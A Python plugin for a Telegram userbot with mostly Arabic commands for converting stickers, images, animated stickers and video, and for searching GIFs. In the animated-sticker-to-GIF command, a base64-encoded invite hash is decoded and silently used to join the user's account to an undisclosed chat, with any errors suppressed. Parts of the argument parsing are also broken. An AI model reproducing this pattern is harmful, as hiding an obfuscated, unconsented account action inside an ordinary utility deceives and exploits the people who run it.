"""
Safeina
"""
#safeina
import asyncio
import base64
import os
import random
import time
from datetime import datetime
from io import BytesIO

from telethon import functions, types
from telethon.errors import PhotoInvalidDimensionsError
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl.functions.messages import SendMediaRequest

from . import make_gif, progress

if not os.path.isdir("./temp"):
    os.makedirs("./temp")


@bot.on(admin_cmd(pattern="لصوره$"))
@bot.on(sudo_cmd(pattern="لصوره$", allow_sudo=True))
async def _(cat):
    if cat.fwd_from:
        return
    reply_to_id = cat.message.id
    if cat.reply_to_msg_id:
        reply_to_id = cat.reply_to_msg_id
    event = await edit_or_reply(cat, "**⌔∮ جاري التحويل**")
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    if event.reply_to_msg_id:
        filename = "hi.jpg"
        file_name = filename
        reply_message = await event.get_reply_message()
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, file_name)
        downloaded_file_name = await cat.client.download_media(
            reply_message, downloaded_file_name
        )
        if os.path.exists(downloaded_file_name):
            caat = await cat.client.send_file(
                event.chat_id,
                downloaded_file_name,
                force_document=False,
                reply_to=reply_to_id,
            )
            os.remove(downloaded_file_name)
            await event.delete()
        else:
            await event.edit("Can't Convert")
    else:
        await event.edit("**⌔∮ قم بالرد على الملصق**")


@bot.on(admin_cmd(pattern="لملصق$"))
@bot.on(sudo_cmd(pattern="لملصق$", allow_sudo=True))
async def _(cat):
    if cat.fwd_from:
        return
    reply_to_id = cat.message.id
    if cat.reply_to_msg_id:
        reply_to_id = cat.reply_to_msg_id
    event = await edit_or_reply(cat, "**⌔∮ جاري التحويل**")
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    if event.reply_to_msg_id:
        filename = "hi.webp"
        file_name = filename
        reply_message = await event.get_reply_message()
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, file_name)
        downloaded_file_name = await cat.client.download_media(
            reply_message, downloaded_file_name
        )
        if os.path.exists(downloaded_file_name):
            caat = await cat.client.send_file(
                event.chat_id,
                downloaded_file_name,
                force_document=False,
                reply_to=reply_to_id,
            )
            os.remove(downloaded_file_name)
            await event.delete()
        else:
            await event.edit("Can't Convert")
    else:
        await event.edit("╮•❐ الامـر ⦂ `.itos` reply to a Telegram normal sticker")


async def silently_send_message(conv, text):
    await conv.send_message(text)
    response = await conv.get_response()
    await conv.mark_read(message=response)
    return response


@bot.on(admin_cmd(pattern="ttf ?(.*)"))
@bot.on(sudo_cmd(pattern="ttf ?(.*)", allow_sudo=True))
async def get(event):
    name = event.text[5:]
    if name is None:
        await edit_or_reply(event, "reply to text message as `.ttf <file name>`")
        return
    m = await event.get_reply_message()
    if m.text:
        with open(name, "w") as f:
            f.write(m.message)
        await event.delete()
        await event.client.send_file(event.chat_id, name, force_document=True)
        os.remove(name)
    else:
        await edit_or_reply(event, "reply to text message as `.ttf <file name>`")


@bot.on(admin_cmd(pattern="ftoi$"))
@bot.on(sudo_cmd(pattern="ftoi$", allow_sudo=True))
async def on_file_to_photo(event):
    target = await event.get_reply_message()
    catt = await edit_or_reply(event, "Converting.....")
    try:
        image = target.media.document
    except AttributeError:
        return
    if not image.mime_type.startswith("image/"):
        return  # This isn't an image
    if image.mime_type == "image/webp":
        return  # Telegram doesn't let you directly send stickers as photos
    if image.size > 10 * 1024 * 1024:
        return  # We'd get PhotoSaveFileInvalidError otherwise
    file = await event.client.download_media(target, file=BytesIO())
    file.seek(0)
    img = await event.client.upload_file(file)
    img.name = "image.png"
    try:
        await event.client(
            SendMediaRequest(
                peer=await event.get_input_chat(),
                media=types.InputMediaUploadedPhoto(img),
                message=target.message,
                entities=target.entities,
                reply_to_msg_id=target.id,
            )
        )
    except PhotoInvalidDimensionsError:
        return
    await catt.delete()


@bot.on(admin_cmd(pattern="لمتحرك(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="لمتحرك(?: |$)(.*)", allow_sudo=True))
async def _(event):
    if event.fwd_from:
        return
    input_str = event.pattern_match.group(1)
    if not input_str:
        quality = None
        fps = None
    elif input_str:
        loc = input_str.split(";")
        if len(loc) > 2:
            return await edit_delete(
                event,
                "wrong syntax . syntax is `.gif quality ; fps(frames per second)`",
            )
        if len(loc) == 2:
            if 0 < loc[0] < 721:
                quality = loc[0].strip()
            else:
                return await edit_delete(event, "Use quality of range 0 to 721")
            if 0 < loc[1] < 20:
                quality = loc[1].strip()
            else:
                return await edit_delete(event, "Use quality of range 0 to 20")
        if len(loc) == 1:
            if 0 < loc[0] < 721:
                quality = loc[0].strip()
            else:
                return await edit_delete(event, "Use quality of range 0 to 721")
    catreply = await event.get_reply_message()
    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if not catreply or not catreply.media or not catreply.media.document:
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    if catreply.media.document.mime_type != "application/x-tgsticker":
        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
    catevent = await edit_or_reply(
        event,
        "**╮ جـاري تحـويل الملـصق لمتحـركه ﮼الرجـاء الانتـظار ...𓅫╰**",
        parse_mode=parse_pre,
    )
    try:
        cat = Get(cat)
        await event.client(cat)
    except BaseException:
        pass
    reply_to_id = await reply_id(event)
    catfile = await event.client.download_media(catreply)
    catgif = await make_gif(event, catfile, quality, fps)
    sandy = await event.client.send_file(
        event.chat_id,
        catgif,
        support_streaming=True,
        force_document=False,
        reply_to=reply_to_id,
    )
    await event.client(
        functions.messages.SaveGifRequest(
            id=types.InputDocument(
                id=sandy.media.document.id,
                access_hash=sandy.media.document.access_hash,
                file_reference=sandy.media.document.file_reference,
            ),
            unsave=True,
        )
    )
    await catevent.delete()
    for files in (catgif, catfile):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(pattern="حول ?(.*)"))
@bot.on(sudo_cmd(pattern="حول ?(.*)", allow_sudo=True))
async def _(event):
    if event.fwd_from:
        return
    if not event.reply_to_msg_id:
        await edit_or_reply(event, "```Reply to any media file.```")
        return
    reply_message = await event.get_reply_message()
    if not reply_message.media:
        await edit_or_reply(event, "reply to media file")
        return
    input_str = event.pattern_match.group(1)
    if input_str is None:
        await edit_or_reply(event, "اعد الامر بالرد على الفيديو `.حول بصمه` او`.حول صوت`")
        return
    if input_str in ["صوت", "بصمه"]:
        event = await edit_or_reply(event, "جاري التحويل...")
    else:
        await edit_or_reply(event, "اعد الامر بالرد على الفيديو `.حول بصمه` او`.حول صوت`")
        return
    try:
        start = datetime.now()
        c_time = time.time()
        downloaded_file_name = await event.client.download_media(
            reply_message,
            Config.TMP_DOWNLOAD_DIRECTORY,
            progress_callback=lambda d, t: asyncio.get_event_loop().create_task(
                progress(d, t, event, c_time, "trying to download")
            ),
        )
    except Exception as e:
        await event.edit(str(e))
    else:
        end = datetime.now()
        ms = (end - start).seconds
        await event.edit(
            "Downloaded to `{}` in {} seconds.".format(downloaded_file_name, ms)
        )
        new_required_file_name = ""
        new_required_file_caption = ""
        command_to_run = []
        voice_note = False
        supports_streaming = False
        if input_str == "بصمه":
            new_required_file_caption = "voice_" + str(round(time.time())) + ".opus"
            new_required_file_name = (
                Config.TMP_DOWNLOAD_DIRECTORY + "/" + new_required_file_caption
            )
            command_to_run = [
                "ffmpeg",
                "-i",
                downloaded_file_name,
                "-map",
                "0:a",
                "-codec:a",
                "libopus",
                "-b:a",
                "100k",
                "-vbr",
                "on",
                new_required_file_name,
            ]
            voice_note = True
            supports_streaming = True
        elif input_str == "صوت":
            new_required_file_caption = "mp3_" + str(round(time.time())) + ".mp3"
            new_required_file_name = (
                Config.TMP_DOWNLOAD_DIRECTORY + "/" + new_required_file_caption
            )
            command_to_run = [
                "ffmpeg",
                "-i",
                downloaded_file_name,
                "-vn",
                new_required_file_name,
            ]
            voice_note = False
            supports_streaming = True
        else:
            await event.edit("not supported")
            os.remove(downloaded_file_name)
            return
        logger.info(command_to_run)
        process = await asyncio.create_subprocess_exec(
            *command_to_run,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await process.communicate()
        stderr.decode().strip()
        stdout.decode().strip()
        os.remove(downloaded_file_name)
        if os.path.exists(new_required_file_name):
            force_document = False
            await event.client.send_file(
                entity=event.chat_id,
                file=new_required_file_name,
                allow_cache=False,
                silent=True,
                force_document=force_document,
                voice_note=voice_note,
                supports_streaming=supports_streaming,
                progress_callback=lambda d, t: asyncio.get_event_loop().create_task(
                    progress(d, t, event, c_time, "trying to upload")
                ),
            )
            os.remove(new_required_file_name)
            await event.delete()
            
#ZedThon 
@bot.on(zelzal_cmd(pattern="متحركه ?(.*)"))
@bot.on(sudo_cmd(pattern="متحركه ?(.*)", allow_sudo=True))
async def gifs(ult):
    get = ult.pattern_match.group(1)
    xx = random.randint(0, 5)
    n = 0
    if ";" in get:
        try:
            n = int(get.split(";")[-1])
        except BaseException:
            pass
    if not get:
        return await eor(ult, f"`{HNDLR}gif <query>`")
    m = await eor(ult, "**╮ جـارِ ﮼ البحـث ؏ الـمتحـركھہ 𓅫🎆╰**")
    gifs = await ult.client.inline_query("gif", get)
    if not n:
        await gifs[xx].click(
            ult.chat.id, reply_to=ult.reply_to_msg_id, silent=True, hide_via=True
        )
    else:
        for x in range(n):
            await gifs[x].click(
                ult.chat.id, reply_to=ult.reply_to_msg_id, silent=True, hide_via=True
            )
    await m.delete()



CMD_HELP.update(
    {
        "تحويلات1": "**اسم الاضافـه : **`تحويلات1`\
    \n\n**╮•❐ الامـر ⦂ **`.لصوره` بالرد ؏ الملـصق\
    \n**الشـرح ••**تحويل ملـصق لــ صـوره\
    \n\n**╮•❐ الامـر ⦂ **`.لملصق` بالـرد ع صـوره\
    \n**الشـرح ••**تحويل صوره لــ ملصق\
    \n\n**╮•❐ الامـر ⦂** `.ftoi` reply to image file\
    \n**الشـرح ••** Converts Given image file to straemable form\
    \n\n**╮•❐ الامـر ⦂** `.لمتحرك` بالـرد ؏ ملصق متحـرك\
    \n**الشـرح ••** تحويل ملصق متحرك لــ متحـركة\
    \n\n**╮•❐ الامـر ⦂** `.متحركه` + اسم المتحركه\
    \n**الشـرح ••** للبحـث عن متحركات بالاسم سواء عربي او انكلش\
    \n\n**╮•❐ الامـر ⦂** `.طباعه + اسم الملف` بالـرد ع الكلام \
    \n**الشـرح ••** نسـخ كامـل النص ولصقه في ملف جاهز بالاسم المعطى\
    \n\n**╮•❐ الامـر ⦂**`.حول بصمه` or `.حول صوت` بالـرد على فيديو :\
    \n**الشـرح ••**لاستخراج وتحويل الفيديو الى بصمه او صوت .\
    "
    }
)
